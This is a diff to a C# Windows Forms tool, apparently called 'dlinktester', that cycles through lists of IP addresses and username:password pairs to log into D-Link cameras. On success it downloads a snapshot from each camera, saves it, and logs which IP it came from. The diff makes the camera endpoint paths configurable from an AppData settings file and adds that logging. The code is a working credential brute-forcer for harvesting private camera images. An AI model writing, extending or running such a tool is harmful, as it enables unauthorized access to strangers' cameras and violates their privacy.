@@ -13,8 +13,12 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
+//dlink:
+// /mjpeg.cgi
+// /image.jpg
+
 namespace dlinktester
-{
+{ 
     public partial class Form1 : Form
     {
         public string[] IPs;
@@ -24,6 +28,11 @@ namespace dlinktester
         public int counter;
         public int iplen;
         public string directory = System.Reflection.Assembly.GetEntryAssembly().Location + @"\";
+        public string appdatafull = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\bruitsettings.dat";
+        public string settings = "";
+        string[] settingdata;
+
+        public string logdata = "";
 
         public Form1()
         {
@@ -61,7 +70,7 @@ namespace dlinktester
                         }
                         Bitmap b;
                         string[] currentcreds = Userlist[o].Split(':');
-                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + currentip + "/mjpeg.cgi");
+                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + currentip + settingdata[0]);
                         request.Method = "GET";
                         request.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
                         request.Timeout = 2000;
@@ -75,7 +84,7 @@ namespace dlinktester
                                 client.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
                                 try
                                 {
-                                    byte[] image = client.DownloadData("http://" + currentip + "/image.jpg");
+                                    byte[] image = client.DownloadData("http://" + currentip + settingdata[1]);
                                     using (var ms = new MemoryStream(image))
                                     {
                                         b = new Bitmap(ms);
@@ -107,6 +116,9 @@ namespace dlinktester
                                     string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());
                                     b.Save(directory + rand + ".jpg", ImageFormat.Jpeg);
                                     b.Dispose();
+                                    logdata = logdata + "\n" + currentip + " > " + rand + ".jpg";
+                                    Console.WriteLine(logdata);
+                                    File.WriteAllText(directory + "/log.txt", logdata);
                                     break;
                                 }
                                 catch
@@ -122,7 +134,7 @@ namespace dlinktester
                         }
                         catch(Exception ex)
                         {
-                            Console.WriteLine(ex);
+                            //Console.WriteLine(ex);
                         }
 
                     }
@@ -220,6 +232,22 @@ namespace dlinktester
                     button4.ForeColor = System.Drawing.Color.Green;
                 }
             }
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            Form settings = new settings();
+            settings.Show();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            if (!File.Exists(appdatafull))
+            {
+                File.Create(appdatafull).Close();
+            }
+            settings = File.ReadAllText(appdatafull);
+            settingdata = settings.Split(':');
         }
     }
 }
